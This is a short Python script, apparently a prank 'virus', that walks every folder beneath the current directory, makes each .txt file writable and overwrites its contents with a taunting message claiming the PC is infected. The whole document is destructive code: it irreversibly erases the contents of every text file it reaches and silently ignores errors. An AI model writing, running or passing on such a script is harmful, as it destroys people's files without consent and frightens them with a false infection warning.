import os,stat
l=[]
for x, y, z in os.walk("."):
    l.append(x + "\\")

for i in l:
    for j in os.listdir(i):
        stri = i + j
        try:
            if os.path.isfile(stri) and not os.path.isdir(stri):
                if stri.endswith('.txt'):
                    os.chmod(stri, stat.S_IWRITE)
                    fh = open(stri, "w")
                    fh.write("There is a virus in your Pc try cleaning using ANTI-VIRUS :P :P")
                    fh.close()
                    print(i + j)
        except:
            print(stri + " cant work")
